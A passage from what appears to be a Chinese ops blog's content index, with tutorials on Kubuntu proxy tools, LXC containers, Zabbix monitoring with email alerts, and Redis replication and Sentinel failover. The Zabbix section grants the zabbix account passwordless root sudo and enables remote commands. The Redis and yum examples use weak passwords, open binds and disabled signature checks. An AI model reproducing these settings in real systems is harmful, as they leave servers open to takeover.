SwitchyOmega下载github上的chrome的.crx文件.\n进入chrome浏览器，进入拓展管理页面，勾选开发模式，把下载好的crx文件拖入插件区域即可。\n后续可以参照firefox即可。\n 如果拖拽不了.crx文件，请使用下面的命令进入chrome，即可安装\n# /opt/google/chrome/chrome --enable-easy-off-store-extension-install 感谢阅读！\n踏坑学习  安装shadowsocks  sudo apt-get install shadowsocks 后面的操作基本上面进行，依然访问不了\ntail -f /var/log/shadowsocks.log 2018-07-25 22:18:31 INFO clinet connecting denied 这里权限拒绝，是支持的加密方式可能和我的VPS不一样 。安装最新的shadowscoks即可解决问题！\nubuntu-lxc容器创建 sudo apt-get install lxc* #搭建lxc sudo apt-get install yum\t#搭建yum sudo lxc-create -n temp -t centos #创建centos系统主机名为temp。 sudo chroot /var/lib/lxc/temp/rootfs passwd\t#输入root密码 sudo lxc-copy -n temp -N node01\t#fork新的虚拟机以temp为模板。 sudo lxc-ls sudo lxc-ls -f\t#查看容器信息 sudo lxc-start -n node01\t#开启 node01 sudo lxc-console -n node01\t#进入 node01 sudo lxc-ls -f\tssh root@10.0.3.116\t#ssh连接 sudo lxc-info -n node01 sudo lxc-start temp sudo lxc-info -n temp sudo lxc-stop -n node01\t#停止服务 sudo lxc-destroy -n node01\t#销毁容器 ","permalink":"https://www.fenghong.tech/blog/2018/2018-07-25-kubuntu/","tags":["Linux","internet","ubuntu","shadowsocks"],"title":"Kubuntu 从安装到科学上网"},{"categories":["ops"],"contents":"摘要：\n 监控系统满足的条件 Zabbix概述 Zabbix安装配置及相关术语 Zabbix实现QQ邮箱通知监控  监控系统满足的条件  采集  agentless: SSH/Telnet SNMP: simple network manage protocal UDP IPMI: intelligent jmx(java management eXtensions): agent: sensor  存储  NVPS (New Values Per Second) Zabbix:MySQL,PGSQL...PHP... Cacti:rrd(round-robin database)...SNMP...Nagios Prometheus: NOSQL,Agent(exporter),Time Series /Streaming Databases.... PHP  可视化  gafana #一个图形界面  告警  Nagios,bash shell Zabbix组件概述 Zabbix server Database Storage Web interface Proxy Agent zabbix介绍  zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。\nzabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。\nzabbix由2部分构成，zabbix server与可选组件zabbix agent。\n**zabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，**它可以运行在Linux, Solaris, HP-UX, AIX, Free BSD, Open BSD, OS X等平台上。\n**zabbix agent需要安装在被监视的目标服务器上，它主要完成对硬件信息或与操作系统有关的内存，CPU等信息的收集。**zabbix agent可以运行在Linux,Solaris,HP-UX,AIX,Free BSD,Open BSD, OS X, Tru64/OSF1, Windows NT4.0, Windows (2000/2003/XP/Vista)等系统之上。\nzabbix server可以单独监视远程服务器的服务状态；同时也可以与zabbix agent配合，可以轮询zabbix agent主动接收监视数据（agent方式），同时还可被动接收zabbix agent发送的数据（trapping方式）。\n另外zabbix server还支持SNMP (v1,v2)，可以与SNMP软件(例如：net-snmp)等配合使用。\n zabbix程序的组件：\nzabbix_server：服务端守护进程； zabbix_agentd：agent守护进程； zabbix_proxy：代理服务器，可选组件； zabbix_get：命令行工具，手动测试向agent发起数据采集请求； zabbix_sender：命令行工具，运行于agent端，手动向server端发送数据； zabbix_java_gateway: java网关； zabbix_database：MySQL或PostgreSQL； zabbix_web：Web GUI zabbix逻辑组件：\n主机组(host group) 主机 (hosts) 监控项(item) key：实现获取监控的目标上的数据的命令或脚本的名称； 应用(application)：同一类监控项的集合； 触发器(trigger)：表达式；PROBLEM， OK； 事件(event)： 动作(action)：由条件(condition)和操作(operation)组件； 媒介(media)：发送通知的通道； 通知(notification)： 远程命令(remote command)： 报警升级()： 模板(template)：快速定义被监控主机的各监控项的预设项目集合； 图形(graph)：用于展示历史数据或趋势数据的图像； 屏幕(screen)：由多个graph组成； Zabbix安装 Zabbix镜像选择 仓库准备，这里选择国内的阿里云镜像（也可以选择清华源），这里使用zabbix3.4\n$ vim /etc/yum.repos.d/zabbix.repo [zabbix] name=zabbix baseurl=https://mirrors.aliyun.com/zabbix/zabbix/3.4/rhel/7/x86_64/ gpgcheck=0 [zabbix-non] name=zabbixnon baseurl=https://mirrors.aliyun.com/zabbix/non-supported/rhel/7/x86_64/ gpgcheck=0 ##复制到从节点一份 $ scp /etc/yum.repos.d/zabbix.repo node01:/etc/yum.repos.d/ 安装并配置Zabbix_Server  开始安装Zabbix server, frontend, agent, get;搭建lamp环境，如果不会可以看前面的博客lamp搭建  # yum install zabbix-server-mysql zabbix-web-mysql zabbix-agent zabbix-get -y # yum install -y httpd mariadb-server php php-mysql 创建数据库，授权zabbix用户并导入数据。  $ systemctl start mariadb httpd $ mysql -uroot -ppassword mysql\u0026gt; create database zabbix character set utf8 collate utf8_bin; mysql\u0026gt; grant all privileges on zabbix.* to zabbix@'192.168.1.%' identified by 'centos'; $ zcat /usr/share/doc/zabbix-server-mysql*/create.sql.gz | mysql -uzabbix -pcentos zabbix -h192.168.1.18 编辑zabbix_server.conf,修改数据库的密码项及主机，其他不变动  $ vim /etc/zabbix/zabbix_server.conf LogFile=/var/log/zabbix/zabbix_server.log LogFileSize=0 PidFile=/var/run/zabbix/zabbix_server.pid SocketDir=/var/run/zabbix DBHost=192.168.1.18 DBName=zabbix DBUser=zabbix DBPassword=centos SNMPTrapperFile=/var/log/snmptrap/snmptrap.log Timeout=4 AlertScriptsPath=/usr/lib/zabbix/alertscripts ExternalScripts=/usr/lib/zabbix/externalscripts LogSlowQueries=3000 修改httpd下的zabbix.conf文件的时区  $ vim /etc/httpd/conf.d/zabbix.conf php_value date.timezone Asia/Shanghai #修改为上海时区。 启动服务  $ systemctl restart zabbix-server zabbix-agent httpd $ systemctl enable zabbix-server zabbix-agent http 访问http://host/zabbix，进行傻瓜式安装，安装生成的配置文件：/etc/zabbix/web/zabbix.conf.php\n安装配置好后进入登录界面，默认用户名Admin，密码zabbix。\n配置Agent端  node01  $ yum install -y zabbix-agent Unit file： zabbix-agent.service  配置说明  配置文件：/etc/zabbix/zabbix_agentd.conf ############ GENERAL PARAMETERS ################# ##### Passive checks related 被动监控相关配置 ##### Active checks related 主动监控相关配置，agent端主动向server周期性发送数据； ############ ADVANCED PARAMETERS ################# ####### USER-DEFINED MONITORED PARAMETERS ####### 用户自定义参数 ####### LOADABLE MODULES ####### ####### TLS-RELATED PARAMETERS #######\t##### Passive checks related Server=IP1, IP2, ... ListenPort=10050 ListenIP=0.0.0.0 StartAgents=3 ##### Active checks related ServerActive=IP1[:port], IP2[:port], ... Hostname=Unique_HOSTNAME 必须与服务器配置的监控主机的主机名称保持一致； zabbix术语  zabbix入门  监控系统： 采集 --\u0026gt; 存储(MySQL/PGSQL/Sqlite) --\u0026gt; 报警 --\u0026gt; 可视化 zabbix： 采集： agent/snmp/IPMI/jmx 设备：主机(hosts) --\u0026gt; 主机组(hostgroups) 监控项(items) --\u0026gt; 应用组(applications) 触发器(triggers, 表达式) --\u0026gt; trigger events 动作(actions, CONDITIONS, OPERATIONS, RECOVERY OPERATIONS) OPERATIONS： remote command send message --\u0026gt; USERS (media) Media Type：Email/ 可视化： graph, slide show, map grafana:  配置流程说明  术语：host groups --\u0026gt; host --\u0026gt; application --\u0026gt; item --\u0026gt; trigger --\u0026gt; action (conditions, operations) graph: simple: 每个item定义完成后自动生成 customed：用于将多个item的数据整合于一个图形中展示\t items  items: key+parameter key: zabbix内建： type: agent (server:pull) agent(active) (agent:push) snmp v1 ... 用户自定义(UserParameter) 采集到的数据的类型： 数值： 整数 浮点数 字符串： 字符串 文本 存储的值： As is：不对数据做任何处理 Delta：（simple change)，本次采样减去前一次采样的值的结果 Delta：（speed per second)，本次采样减去前一次采样的值，再除以经过的时长；  trigger  trigger： 界定某特定的item采集到的数据的非合理区间或非合理状态：逻辑表达式 逻辑表达式，阈值；通常用于定义数据的不合理区间； OK：正常 状态 --\u0026gt; 较老的zabbix版本，其为FALSE； PROBLEM：非正常 状态 --\u0026gt; 较老的zabbix版本，其为TRUE； OK --\u0026gt; PROBLEM Recovery：PROBLEM --\u0026gt; OK 触发器存在可调用的函数： nodata() last() date() time() now() dayofmonth() ... Severity：严重等级 Not classified Information Warning Average High Disaster 触发器表达式： {hostname:key[paramters].function(arguments) \u0026gt;, \u0026lt;, =, #（not equal）... +, -, *, / \u0026amp;, | {n1.magedu.com:net.if.in[eno16777736,packets].last(#1)}\u0026gt;15 trigger间存在依赖关系： zabbix server \u0026lt;--\u0026gt; Router1 \u0026lt;--\u0026gt; Host1 事件机制： 四种事件源：trigger, discovery, auto registration, internal  Media  Media：媒介 告警信息的传递通道； 类型： Email：邮件 Script：自定义脚本 SMS：短信 Jabber： Ez Texting： 接收信息的目标为zabbix用户： 需要用户上定义对应各种媒介通道的接收方式；  Action  conditions：\t多个条件之间存在逻辑关系； operations： 条件满足时触发的操作； send message： (1) Media type：传递信息的通道； (a) Email (b) Script：报警脚本； 脚本放置路径：zabbix_server.conf配置文件中AlertScriptsPath参数定义的路径下； /usr/lib/zabbix/alertscripts/ zabbix服务器在调用脚本时，会向其传递三个参数： $1：经由此信道接收信息的目标； $2：subject $3：body zabbix 3.0之后的版本，此三个变量定义为内部宏： {ALERT.SENDTO} {ALERT.SUBJECT} {ALERT.MESSAGE} (2) 信息接收人： (a) User Groups (b) Users admin:  Python报警脚本示例：  #!/usr/bin/python #coding:utf-8 import smtplib from email.mime.text import MIMEText from email.header import Header from email.utils import parseaddr, formataddr import sys def formatAddr(s): name, addr = parseaddr(s) return formataddr((Header(name, 'utf-8').encode(), addr)) def send_mail(to_list,subject,content): mail_host = 'smtp.exmail.qq.com' mail_user = 'USERNAME@DOMAIN.TLD' mail_pass = 'YOUR_PASSWORD' #以上内容根据你的实际情况进行修改,pass为stmp的授权码。 msg = MIMEText(content,'','utf-8') msg['Subject'] = Header(subject, 'utf-8').encode() msg['From'] = formatAddr('zabbix监控 \u0026lt;%s\u0026gt;' % mail_user).encode() msg['to'] = to_list try: s = smtplib.SMTP() s.connect(mail_host) s.login(mail_user,mail_pass) s.sendmail(mail_user,to_list,msg.as_string()) s.close() return True except Exception,e: print str(e) return False if __name__ == \u0026quot;__main__\u0026quot;: send_mail(sys.argv[1], sys.argv[2], sys.argv[3])  remote command  功能： 在agent所在的主机上运行用户指定的命令或脚本；例如： 重启服务； 通过IPMI重启服务器； 任何用户自定义脚本中定义的操作； 可执行的命令类型： IPMI ssh telnet Custom Script Global Script 前提： 在agent需要完成的配置： (1) zabbix用户拥有所需要的管理权限； 编辑/etc/sudoers文件，注释如下行； ]# visudo # Defaults requiretty 添加如下行： zabbix ALL=(ALL) NOPASSWD: ALL (2) agent进程要允许执行远程命令； ]# vim /etc/zabbix/zabbix_agentd.conf，设置如下配置： EnableRemoteCommands=1 重启服务生效；  总结：  host groups --\u0026gt; host --\u0026gt; application --\u0026gt; item (key) --\u0026gt; trigger --\u0026gt; action (1) media type (2) user group/user action operations: 可定义为升级方式； send message remote command Zabbix告警消息通过qq邮件发送  情形  zabbix_server (Zabbix) 3.4.11 zabbix_agentd (daemon) (Zabbix) 3.4.11 -------------------------- Zabbix_server 192.168.1.18 Zabbix_agent 192.168.1.28 Zabbix-server配置  安装相关的邮件服务，当然qq号不会是自己的啦  $ yum install -y mailx dos2unix $ vim /etc/mail.rc set from=932165012@qq.com set smtp=smtp.qq.com set smtp-auth-user=932165012@qq.com set smtp-auth-password=************ #此次password是授权码，而不是登录密码，自行谷歌解决。 set smtp-auth=login set ssl-verify=ignore set nss-config-dir=/etc/pki/nssdb  测试邮件服务是否可用，收到邮件即可认为成功  $ echo \u0026quot;zabbix test mail\u0026quot; |mail -s \u0026quot;zabbix\u0026quot; 932165012@qq.com  编写bash脚本，/usr/lib/zabbix/alertscripts/mail.sh,Zabbix的配置文件定义此文件为脚本文件目录。  $ vim /usr/lib/zabbix/alertscripts/mail.sh #!/bin/bash to=$1 subject=$2 body=$3 #三个参数对应是收件人，主题，邮件主体内容 date \u0026quot;+%F %T\u0026quot; \u0026gt;\u0026gt; /usr/lib/zabbix/alertscripts/sendmail.log echo \u0026quot;$to\u0026quot; \u0026quot;$subject\u0026quot; \u0026quot;$body\u0026quot; \u0026gt;\u0026gt; /usr/lib/zabbix/alertscripts/sendmail.log #记录发件日志 echo \u0026quot;$body\u0026quot; | dos2unix -k | mail -s \u0026quot;$subject\u0026quot; \u0026quot;$to\u0026quot; #发邮件的命令，dos2unix转码发送。防止乱码 $ chmod +x /usr/lib/zabbix/alertscripts/mail.sh web界面进行配置 主机相关配置  hosts配置  Host name node01.fenghong.tech Visible name node01 Groups My Servers\tAgent interfaces IP address\tDNS name\tConnect to\tPort\tDefault 192.168.1.28 10050 #Groups随便从列表里选一个，我选的是my servers。 #主要是主机名，别名和Agent的IP配置，当然如果有DNS解析，填写主机名也是没有问题的 #点击Add添加即可  applications  Configuration-----\u0026gt; node01 -----\u0026gt; Applications ------\u0026gt; Create Application name nginx status  items  Configuration-----\u0026gt; node01 -----\u0026gt; items -----\u0026gt; Create item Name\tNginx service state Type\tZabbix agent\t#系统默认 Key\tnet.tcp.port[192.168.1.28,80] Host interface 192.168.1.28:10050\t#系统默认 Type of information Numeric(unsigned)\t#系统默认 Update interval\t5s Applications nginx status #刚创建的  trigger配置  Configuration-----\u0026gt; node01 -----\u0026gt; triggers -----\u0026gt; create trigger Name\tnginx down Severity\tHigh Exprssion\t-----\u0026gt; add Last of(T) 3 Count #下拉选择Count insert #配置完成Add\t报警动作配置  Meida types配置  Administration-----\u0026gt; Media types ------\u0026gt; create media type Name QqMailAlarm #名字随便写 Type Script #选择Script Script name mail.sh\t#填写为上面编写的脚本文件 Script parameters Parameter\tAction {ALERT.SENDTO} {ALERT.SUBJECT} {ALERT.MESSAGE} #这三个宏变量顺序不能错，然后点击Add即可  用户配置  Administration-----\u0026gt; Users -----\u0026gt; Admin -----\u0026gt; Media -----\u0026gt; Add Type QqMailAlarm #Media Type 的名称，下拉选项 Send to 932165012@qq.com\t#填写发送至相应的qq邮箱 When active 1-7,00:00-24:00\t#发送的时间 Use if severity\t#级别，建议根据人员的级别而发送不同的通知，默认全部勾选 Not classified Information Warning Average High Disaster Enabled # 配置好后，点击添加Add完成用户的配置。  配置action,默认已经配置好trigger和hosts。比如  Configuration -----\u0026gt; Actions -----\u0026gt; create action -----\u0026gt; Action Name\tnginx sevice #选择一个名字，这里用nginx服务来检测 Conditions\tLabel\tName\tAction A\tTrigger = node01: nginx down\tRemove #node01 为配置好的hosts #nginx down 为配置好的trigger #选择Trigger，点击select即可选择配置好的trigger New condition Add Enabled -----\u0026gt; Operations Default operation step duration 60s\t#选择60s为了方便检测是否发送了邮件 Default subject\tProblem: {TRIGGER.NAME} #默认即可 Default message Problem started at {EVENT.TIME} on {EVENT.DATE} Problem name: {TRIGGER.NAME} Host: {HOST.NAME} Severity: {TRIGGER.SEVERITY} Original problem ID: {EVENT.ID} {TRIGGER.URL} ----\u0026gt; 点击Operation New，来进行配置动作。 Send to Users\t然后Add选择Admin Send only to 下拉选择QqMailAlarm #然后点击最下面的Add，添加Action #至此，基本结束。  验证告警信息是否成功自动发送邮件,停止node01上的nginx服务,能立马收到邮件。  $ systemctl stop nginx  当然，Zabbix也支持远程的脚本命令来进行某些操作，比如重启nginx服务，这里面又涉及Remote command，这里不赘述了。  ","permalink":"https://www.fenghong.tech/blog/2018/2018-07-21-zabbix/","tags":["Linux","internet","server","zabbix"],"title":"Zabbix"},{"categories":["ops"],"contents":"摘要：\n 分布式系统存储特点 Redis概述及安装 Redis集群及HA高可用实现  分布式存储特点 CAP：一个分布式系统不可能同时满足C、A、P三个特性，最多可同时满足其中两者；对于分布式统满足分区容错性几乎是必须的 C：多个数据节点上的数据一致； A：用户发出请求后的有限时间范围内返回结果； P：network partition，网络发生分区后，服务是否依然可用； BASE：BA，S，E，基于CAP演化而来 BA：Basically Available，基本可用； S：Soft state，软状态/柔性事务，即状态可以在一个时间窗口内是不同步的； E：Eventually consistency，最终一致性； 分布式一致性协议：Paxos，Raft等\nRedis概述  随着业务的增长和产品的完善，急速增长的数据给Oracle数据库带来了很大的压力，而随着我们对产品服务质量要求的提高，传统的数据查询方式已无法满足我们需求。为此我们需要寻找另外一种模式来提高数据查询效率。NoSQL内存数据库是最近兴起的新型数据库，Nosql官网，它的特点就是把数据放在内存中操作，数据处理速度相对于磁盘提高了好几个量级，因此，通过把经常访问的数据转移到内存数据库中，不但可以缓解Oracle的访问压力，而且可以极大提高数据的访问速度，提高用户体验。\nRedis是一个开源的，先进的key-value持久化产品。它通常被称为数据结构服务器，REmote DIctionary Server，它的值可以是字符串（String）、哈希（Map）、列表（List）、集合（Sets）和有序集合（Sorted sets）等类型。可以在这些类型上面做一些原子操作，如：字符串追加、增加Hash里面的值、添加元素到列表、计算集合的交集，并集和差集；或者区有序集合中排名最高的成员。为了取得好的性能，Redis是一个内存型数据库。不限于此，Redis也可以把数据持久化到磁盘中，或者把数据操作指令追加了一个日志文件，把它用于持久化。也可以用Redis容易的搭建master-slave架构用于数据复制。其它让它像缓存的特性包括，简单的check-and-set机制，pub/sub和配置设置。Redis可以用大部分程序语言来操作：C、C++、C#、Java、Node.js、php、ruby等等。Redis是用ANSIC写的，可以运行在多数POSIX系统，如：Linux，*BSD，OS X和Soloris等。官方版本不支持Windows下构建，可以选择一些修改过的版本，照样可以使用Redis。\n Redis简介  安装及配置  centos系统的base仓库自带redis-3.2.10，我们用yum安装即可.\n~]# yum info redis ~]# yum install -y redis ~]# rpm -q --scripts redis ~]# rpm -ql redis ~]# vim /etc/redis.conf #仅修改以下选项 bind 0.0.0.0\t#增加监听地址为所有 requirepass ilinux #要求密码验证 ~]# systemctl start redis ~]# grep '^####' /etc/redis.conf #配置文件的段落如下 ################################## INCLUDES ################################### ################################## NETWORK ##################################### ################################# GENERAL ##################################### ################################ SNAPSHOTTING ################################ ################################# REPLICATION ################################# ################################## SECURITY ################################### ################################### LIMITS #################################### ############################## APPEND ONLY MODE ############################### ################################ LUA SCRIPTING ############################### ################################ REDIS CLUSTER ############################### ################################## SLOW LOG ################################### ################################ LATENCY MONITOR ############################## ############################# EVENT NOTIFICATION ############################## ############################### ADVANCED CONFIG ###############################  Redis的基本数据结构（5种）  1.STRING：可以存储字符串、浮点型、整型，如果是字符串可以执行字符串操作，如果是浮点型、整型也可以执行加减操作。redis会识别出它的具体类型。 2.LIST：链表，链表中的每个NODE包含一个字符串。可以对链表进行两端推入、弹出操作。 3.SET：无序集合，不会存在相同的集合元素，集合的交集、并集、差集运算。 4.HASH：键值对的无需散列，增、删、获取键值。 5.ZSET：有序集合，根据一个浮点数分值来排序。  redis两种持久化原理（RDB、AOF）  redis支持两种方式来持久化数据 第一种：snapshotting(镜像或快照）也称RDB; 第二种：AOF(append-only file 文件追加)。 如： RDB：镜像模式就是将某个时间段的所有内存数据直接写入硬盘。 AOF：将执行的写命令增量复制到硬盘里面。 这两种其实就是不同的侧重，RDB是数据持久化，AOF是命令持久化，数据持久化比较直接，还原的时候直接恢复数据即可。命令持久化恢复的话需要执行一遍命令才行。 redis执行持久化操作取决于两方面：默认是根据持久化配置来执行，还有就是用户手动触发。手动触发有两个命令 SAVE:会block所有的用户操作，知道持久化结束。 BGSAVE:后台子进程执行，linux中使用fork命令开启一个子进程副本，这个子进程副本与主进程共用一套内存空间，直到主进程或子进程对内存进行修改，被修改之后的内存区域将被子进程复制出来单独使用。 持久化存储对应的配置文件设置\n$ vim /etc/redis.conf ################################ SNAPSHOTTING ################################ save 900 1 save 300 10 save 60 10000 save 5 200000 stop-writes-on-bgsave-error yes rdbcompression yes rdbchecksum yes dbfilename dump.rdb dir /var/lib/redis ############################## APPEND ONLY MODE ############################### appendonly no appendfilename \u0026quot;appendonly.aof\u0026quot; appendfsync everysec no-appendfsync-on-rewrite no auto-aof-rewrite-percentage 100 auto-aof-rewrite-min-size 64mb aof-load-truncated yes 登录，查询帮助，Redis3.2版本有个很好的显示帮助，Tab补全功能强大。\n 基本用法  ~]# redis-cli 127.0.0.1:6379\u0026gt; AUTH ilinux #认证，和配置文件的requirepass相对应 OK 127.0.0.1:6379\u0026gt; help redis-cli 3.2.10 To get help about Redis commands type: \u0026quot;help @\u0026lt;group\u0026gt;\u0026quot; to get a list of commands in \u0026lt;group\u0026gt; \u0026quot;help \u0026lt;command\u0026gt;\u0026quot; for help on \u0026lt;command\u0026gt; \u0026quot;help \u0026lt;tab\u0026gt;\u0026quot; to get a list of possible help topics \u0026quot;quit\u0026quot; to exit 127.0.0.1:6379\u0026gt; help @list 127.0.0.1:6379\u0026gt; rpush weekdays Sunday 127.0.0.1:6379\u0026gt; LPUSH weekdays Sun Mon Tue Wed 127.0.0.1:6379\u0026gt; lindex weekdays 0 \u0026quot;Wed\u0026quot; 127.0.0.1:6379\u0026gt; lindex weekdays 1 \u0026quot;Tue\u0026quot; 127.0.0.1:6379\u0026gt; lindex weekdays 2 \u0026quot;Mon\u0026quot; 127.0.0.1:6379\u0026gt; lindex weekdays 3 \u0026quot;Sun\u0026quot; 127.0.0.1:6379\u0026gt; lindex weekdays 4 \u0026quot;Sunday\u0026quot; 127.0.0.1:6379\u0026gt; llen weekdays (integer) 5 127.0.0.1:6379\u0026gt; lpop weekdays \u0026quot;Wed\u0026quot; 127.0.0.1:6379\u0026gt; lpop weekdays \u0026quot;Tue\u0026quot; 127.0.0.1:6379\u0026gt; lpop weekdays \u0026quot;Mon\u0026quot; 127.0.0.1:6379\u0026gt; lpop weekdays \u0026quot;Sun\u0026quot; 127.0.0.1:6379\u0026gt; llen weekdays (integer) 1 127.0.0.1:6379\u0026gt; lindex weekdays 0 \u0026quot;Sunday\u0026quot; 127.0.0.1:6379\u0026gt; rpush weekdays Mon Tue Wed (integer) 4 127.0.0.1:6379\u0026gt; lrange weekdays 1 3 1) \u0026quot;Mon\u0026quot; 2) \u0026quot;Tue\u0026quot; 3) \u0026quot;Wed\u0026quot; 127.0.0.1:6379\u0026gt; llen weekdays (integer) 4 127.0.0.1:6379\u0026gt; lrange weekdays 1 10 1) \u0026quot;Mon\u0026quot; 2) \u0026quot;Tue\u0026quot; 3) \u0026quot;Wed\u0026quot; 127.0.0.1:6379\u0026gt; lrange weekdays 0 10 1) \u0026quot;Sunday\u0026quot; 2) \u0026quot;Mon\u0026quot; 3) \u0026quot;Tue\u0026quot; 4) \u0026quot;Wed\u0026quot; 127.0.0.1:6379\u0026gt; ltrim weekdays 1 2 OK 127.0.0.1:6379\u0026gt; lrange weekdays 0 10 1) \u0026quot;Mon\u0026quot; 2) \u0026quot;Tue\u0026quot;  @SET，无序集合，不会存在相同的集合元素，集合的交集、并集、差集运算。  127.0.0.1:6379\u0026gt; help @set SADD key member [member ...] summary: Add one or more members to a set since: 1.0.0 SCARD key summary: Get the number of members in a set since: 1.0.0 SDIFF key [key ...] summary: Subtract multiple sets since: 1.0.0 SDIFFSTORE destination key [key ...] summary: Subtract multiple sets and store the resulting set in a key since: 1.0.0 SINTER key [key ...] summary: Intersect multiple sets since: 1.0.0 SINTERSTORE destination key [key ...] summary: Intersect multiple sets and store the resulting set in a key since: 1.0.0 SISMEMBER key member summary: Determine if a given value is a member of a set since: 1.0.0 SMEMBERS key summary: Get all the members in a set since: 1.0.0 SMOVE source destination member summary: Move a member from one set to another since: 1.0.0 SPOP key [count] summary: Remove and return one or multiple random members from a set since: 1.0.0 SRANDMEMBER key [count] summary: Get one or multiple random members from a set since: 1.0.0 SREM key member [member ...] summary: Remove one or more members from a set since: 1.0.0 SSCAN key cursor [MATCH pattern] [COUNT count] summary: Incrementally iterate Set elements since: 2.8.0 SUNION key [key ...] summary: Add multiple sets since: 1.0.0 SUNIONSTORE destination key [key ...] summary: Add multiple sets and store the resulting set in a key since: 1.0.0 127.0.0.1:6379\u0026gt; SADD stus tom jerry lilei hanmeimei lucy lily (integer) 6 127.0.0.1:6379\u0026gt; SPOP stus 2 1) \u0026quot;lily\u0026quot; 2) \u0026quot;lilei\u0026quot; 127.0.0.1:6379\u0026gt; SCARD stus (integer) 4 127.0.0.1:6379\u0026gt; smembers stus 1) \u0026quot;jerry\u0026quot; 2) \u0026quot;hanmeimei\u0026quot; 3) \u0026quot;tom\u0026quot; 4) \u0026quot;lucy\u0026quot; 127.0.0.1:6379\u0026gt; srem stus hanmeimei (integer) 1 127.0.0.1:6379\u0026gt; smembers stus 1) \u0026quot;jerry\u0026quot; 2) \u0026quot;tom\u0026quot; 3) \u0026quot;lucy\u0026quot; 127.0.0.1:6379\u0026gt; SADD stus2 tom jeryy lucy lilei (integer) 4 127.0.0.1:6379\u0026gt; sinter stus stus2 1) \u0026quot;tom\u0026quot; 2) \u0026quot;lucy\u0026quot; 127.0.0.1:6379\u0026gt; sunion stus stus2 1) \u0026quot;jerry\u0026quot; 2) \u0026quot;lilei\u0026quot; 3) \u0026quot;jeryy\u0026quot; 4) \u0026quot;tom\u0026quot; 5) \u0026quot;lucy\u0026quot; 127.0.0.1:6379\u0026gt; sdiff stus stus2 1) \u0026quot;jerry\u0026quot; 127.0.0.1:6379\u0026gt; sdiff stus2 stus 1) \u0026quot;lilei\u0026quot; 2) \u0026quot;jeryy\u0026quot; redis主从  Redis支持将数据同步到多台从库上，这种特性对提高读取性能非常有益。master可以有多个slave。除了多个slave连到相同的master外，slave也可以连接其它slave形成图状结构。主从复制不会阻塞master。也就是说当一个或多个slave与master进行初次同步数据时，master可以继续处理客户端发来的请求。相反slave在初次同步数据时则会阻塞不能处理客户端的请求。\n主从复制可以用来提高系统的可伸缩性,我们可以用多个slave 专门用于客户端的读请求，比如sort操作可以使用slave来处理。也可以用来做简单的数据冗余。可以在 master 禁用数据持久化，只需要注释掉 master 配置文件中的所有 save 配置，然后只在 slave 上配置数据持久化。\n  redis cluster  master 192.168.1.18 slave 192.168.1.28  master相关配置  $ yum install -y redis $ grep '^[^#]' /etc/redis.conf bind 0.0.0.0 #保证protected-mode不运行 requirepass ilinux $ systemctl start redis  slave相关配置  $ yum install -y redis $ vim /etc/redis.conf #仅修改以下选项 bind 0.0.0.0 requirepass ilinux slaveof 192.168.1.18 6379 masterauth ilinux $ systemctl start redis $ redis-cli -a ilinux 127.0.0.1:6379\u0026gt; INFO replication # Replication role:master connected_slaves:1 slave0:ip=192.168.1.28,port=6379,state=online,offset=77446,lag=1 Redis的主从配置相当简单，相对于mysql的冗杂。\nRedis-HA的sentinel方案 试验环境如下\n-------------------- Arch : x86_64 -------------------- centos 7.5 -------------------- master 192.168.1.18 node01 192.168.1.28 node02 192.168.1.30 redis 的高可用方案基于自己的一套sentinel 集群来管理。\n先配置主从,修改配置文件/etc/redis.conf\nmaster节点 $ $ vim /etc/redis.conf bind 0.0.0.0 requirepass ilinux node01节点 $ vim /etc/redis.conf bind 0.0.0.0 requirepass ilinux slaveof 192.168.1.18 6379 masterauth ilinux node01节点 $ vim /etc/redis.conf bind 0.0.0.0 requirepass ilinux slaveof 192.168.1.18 6379 masterauth ilinux $ systemctl start redis #三台主机全部启动redis服务。 $ redis-cli -a ilinux 127.0.0.1:6379\u0026gt; INFO replication # Replication role:master connected_slaves:2 slave0:ip=192.168.1.28,port=6379,state=online,offset=77446,lag=1 slave1:ip=192.168.1.30,port=6379,state=online,offset=77446,lag=1 master_repl_offset:77585 repl_backlog_active:1 repl_backlog_size:1048576 repl_backlog_first_byte_offset:2 repl_backlog_histlen:77584 再配置HA，/etc/redis-sentinel.conf配置文件\n$ vim /etc/redis-sentinel.conf #修改以下选项 bind 0.0.0.0 #否则要进行认证，保证protected-mode不运行 # sentinel myid 65ca85904ebbf0dbf0d88b18c53a5ffedbedc8f9 #要用到scp，保证myid不重复。 sentinel monitor mymaster 192.168.1.18 6379 2 sentinel auth-pass mymaster ilinux $ scp /etc/redis-sentinel.conf node01:/etc/ $ scp /etc/redis-sentinel.conf node02:/etc/ $ systemctl start redis-sentinel.service 高可用试验验证\nredis-cli -p 26379 127.0.0.1:26379\u0026gt; sentinel masters #查看master信息， 127.0.0.1:26379\u0026gt; sentinel slaves mymaster #mymaster 为集群名称 $ systemctl stop redis #停止主节点的redis服务。 $ redis-cli -p 26379 127.0.0.1:26379\u0026gt; sentinel masters\t#隔一段时间，查看信息。 10) \u0026quot;master,disconnected\u0026quot;\t#主节点失联 10）\u0026quot;s_down,master,disconnected\t#主观_down 10) \u0026quot;s_down,o_down,master,disconnected\u0026quot;\t#客观_down 10）\u0026quot;master\u0026quot; ##这里已经更换了主节点了。\t#switch-master #这里可以看日志更为详细 $ tail -f /var/log/redis/sentinel.log 2448:X 24 Jul 17:07:03.499 # +sdown master mymaster 192.168.1.18 6379 2448:X 24 Jul 17:07:03.540 # +new-epoch 3 2448:X 24 Jul 17:07:03.542 # +vote-for-leader 65ca85904ebbf0dbf0d88b18c53a5ffedbedc8f9 3 2448:X 24 Jul 17:07:03.562 # +odown master mymaster 192.168.1.18 6379 #quorum 3/2 2448:X 24 Jul 17:07:03.562 # Next failover delay: I will not start a failover before Tue Jul 24 17:13:04 2018 2448:X 24 Jul 17:07:04.427 # +config-update-from sentinel 65ca85904ebbf0dbf0d88b18c53a5ffedbedc8f9 192.168.1.18 26379 @ mymaster 192.168.1.18 6379 2448:X 24 Jul 17:07:04.427 # +switch-master mymaster 192.168.1.18 6379 192.168.1.30 6379 2448:X 24 Jul 17:07:04.427 * +slave slave 192.168.1.18:6379 192.168.1.18 6379 @ mymaster 192.168.1.30 6379 2448:X 24 Jul 17:07:04.427 * +slave slave 192.168.1.28:6379 192.168.1.28 6379 @ mymaster 192.168.1.30 6379 2448:X 24 Jul 17:07:34.431 # +sdown slave 